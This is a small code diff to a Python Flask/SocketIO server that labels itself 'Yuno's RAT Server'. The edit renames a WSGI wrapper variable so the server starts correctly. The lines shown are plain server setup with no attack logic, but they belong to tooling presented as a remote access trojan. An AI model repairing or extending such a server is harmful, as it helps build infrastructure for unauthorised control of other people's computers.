@@ -10,7 +10,7 @@ import os
 # Initialize Flask and SocketIO
 app = Flask(__name__)
 sio = socketio.Server(cors_allowed_origins="*")
-app = socketio.WSGIApp(sio, app)
+wsgi_app = socketio.WSGIApp(sio, app)
 
 # Client information storage
 client_info = {}
@@ -102,4 +102,4 @@ def index():
 if __name__ == '__main__':
     print("=== Yuno's RAT Server ===")
     print("A remote access server by Yuno\n")
-    eventlet.wsgi.server(eventlet.listen(('', 5000)), app)
+    eventlet.wsgi.server(eventlet.listen(('', 5000)), wsgi_app)
